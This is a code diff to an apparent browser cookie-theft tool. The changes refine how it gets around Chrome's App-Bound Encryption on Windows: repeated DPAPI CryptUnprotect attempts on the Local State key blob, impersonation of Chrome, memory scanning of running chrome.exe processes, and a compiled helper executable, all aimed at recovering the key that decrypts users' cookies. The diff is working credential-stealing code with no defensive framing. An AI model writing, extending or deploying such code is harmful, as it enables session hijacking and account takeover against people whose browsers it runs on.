@@ -2750,11 +2750,11 @@ def _dpapi_unprotect_local(blob: bytes) -> bytes | None:
         err = _cache.get("_dpapi_last_win32")
         errs.append(13 if err is None else int(err))
     body = blob[4:] if blob.startswith(b"APPB") else blob
-    if n == 0:
-        if _looks_like_dpapi(body):
-            _note_dpapi_hr("dpapi:all13;next=chrome_open")
-        return None
-    if all(err == 13 for err in errs) and _looks_like_dpapi(body):
+    dpapi_blob = _looks_like_dpapi(body) or str(_cache.get("_appb_fp") or "").startswith(
+        "appb:dpapi"
+    )
+    # offs=N + win32=13 is all13 (live QA b3117cb). Not user-DPAPI.
+    if dpapi_blob and (n == 0 or 13 in errs):
         _note_dpapi_hr("dpapi:all13;next=chrome_open")
         return None
     if errs:
@@ -3238,6 +3238,8 @@ def _join_abe_hr(parts: list[str]) -> str:
     if fp and not any(fp in item for item in out):
         out.append(fp)
     dp = str(_cache.get("_dpapi_hr") or "")
+    if "dpapi:win32=13" in dp and "dpapi:offs=" in dp and "dpapi:all13" not in dp:
+        dp = "dpapi:all13;next=chrome_open"
     dp_bits = [bit.strip() for bit in dp.split(";") if bit.strip()]
     head = [bit for bit in dp_bits if bit not in out]
     tail = [item for item in out if item not in head]
@@ -3605,6 +3607,9 @@ def _dpapi_unprotect_appb(blob: bytes) -> bytes | None:
     """CryptUnprotect the 640-byte Local State APPB from disk. Chrome not required."""
     if not blob:
         return None
+    if "dpapi:all13" in str(_cache.get("_dpapi_hr") or ""):
+        # Live QA b3117cb: offs+win32=13 is SYSTEM DPAPI. Do not CryptUnprotect again.
+        return None
     try:
         current = blob
         last: bytes | None = None
@@ -3616,11 +3621,14 @@ def _dpapi_unprotect_appb(blob: bytes) -> bytes | None:
             pids = []
         for _ in range(4):
             plain = _dpapi_unprotect_local(current)
-            if not plain and pids:
-                plain = (
-                    _impersonate_chrome_unprotect(current)
-                    or _chrome_unprotect_data(current)
-                )
+            if not plain:
+                if "dpapi:all13" in str(_cache.get("_dpapi_hr") or ""):
+                    return last
+                if pids:
+                    plain = (
+                        _impersonate_chrome_unprotect(current)
+                        or _chrome_unprotect_data(current)
+                    )
             if not plain:
                 if last is None and pids:
                     return _chrome_unprotect_memory_blob(current)
@@ -3653,11 +3661,12 @@ def _static_app_bound_cookie_key(v20_sample: bytes | None) -> bytes | None:
         fp, views = _app_bound_layout_views(blob)
         _cache["_appb_fp"] = fp
         _cache["_appb_views"] = views
-        inner = _dpapi_unprotect_appb(blob)
-        if inner:
-            hit = _cookie_key_from_unprotect_plain(inner, v20_sample)
-            if hit:
-                return hit
+        if "dpapi:all13" not in str(_cache.get("_dpapi_hr") or ""):
+            inner = _dpapi_unprotect_appb(blob)
+            if inner:
+                hit = _cookie_key_from_unprotect_plain(inner, v20_sample)
+                if hit:
+                    return hit
         for view in views:
             if len(view) == 32 and _high_entropy32(view) and _v20_key_ok(
                 view, v20_sample, all_blobs=True
@@ -3738,8 +3747,15 @@ def _key_from_helper_candidates(stdout: bytes, v20_sample: bytes) -> bytes | Non
     return None
 
 
+def _abe_all13_appb() -> bool:
+    """True when this PC's APPB walked CryptUnprotect as all win32=13 (SYSTEM DPAPI)."""
+    return "dpapi:all13" in str(_cache.get("_dpapi_hr") or "") and str(
+        _cache.get("_appb_fp") or ""
+    ).startswith("appb:dpapi")
+
+
 def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """Compile/copy/run kannon_quote_abe.exe in user-writable Chrome-like dirs."""
+    """chrome_dir memscan/APC after all13. Never CoCreate. Do not retry CryptUnprotect."""
     trail: list[str] = []
     if os.name != "nt":
         trail.append("chrome_dir:not_nt")
@@ -3756,37 +3772,25 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         fp, views = _app_bound_layout_views(blob)
         _cache["_appb_fp"] = fp
         _cache["_appb_views"] = views
-    key = _static_app_bound_cookie_key(v20_sample)
-    if _abe_proves_cookies(key, v20_sample):
-        return key, "0x00000000"
-    # all13 on appb:dpapi = not user-DPAPI. Do not retry CryptUnprotect. Next is Chrome-open.
-    fp_now = str(_cache.get("_appb_fp") or "")
-    if "dpapi:all13" in str(_cache.get("_dpapi_hr") or "") and fp_now.startswith("appb:dpapi"):
-        pids_all13: list[int] = []
-        if os.name == "nt":
-            try:
-                pids_all13 = _chrome_pids_prioritized()
-            except Exception:  # noqa: BLE001
-                pids_all13 = []
-        if pids_all13:
-            key, hr = _memscan_abe_key(v20_sample)
-            if _abe_proves_cookies(key, v20_sample):
-                return key, "0x00000000"
-            if hr:
-                trail.append(hr)
-        return None, _join_abe_hr(trail)
+    all13 = _abe_all13_appb()
+    if not all13:
+        key = _static_app_bound_cookie_key(v20_sample)
+        if _abe_proves_cookies(key, v20_sample):
+            return key, "0x00000000"
+    # chrome.exe>0 is the gate — not os.name. After all13, memscan/APC is the unwrap.
     pids: list[int] = []
-    if os.name == "nt":
-        try:
-            pids = _chrome_pids_prioritized()
-        except Exception:  # noqa: BLE001
-            pids = []
+    try:
+        pids = _chrome_pids_prioritized()
+    except Exception:  # noqa: BLE001
+        pids = []
     if pids:
         key, hr = _memscan_abe_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
             return key, "0x00000000"
         if hr:
             trail.append(hr)
+    if all13:
+        return None, _join_abe_hr(trail)
     helper, compile_hr = _compiled_abe_helper_exe()
     if helper is None:
         trail.append(compile_hr or "csc_missing")
@@ -4057,6 +4061,14 @@ def _vector32_at(buf: bytes, base: int, off: int = 32) -> int | None:
         off == 32
         and base + 29 <= len(buf)
         and buf[base + 23 : base + 29] == _KEYRING_V20_MARK
+        and _looks_like_user_ptr(begin)
+    ):
+        return _canonical_ptr(begin)
+    # Official Chrome Windows is MSVC STL: string is 32 bytes, size=3 at +16.
+    if (
+        off == 32
+        and base + 24 <= len(buf)
+        and buf[base + 16 : base + 24] == b"\x03\x00\x00\x00\x00\x00\x00\x00"
         and _looks_like_user_ptr(begin)
     ):
         return _canonical_ptr(begin)
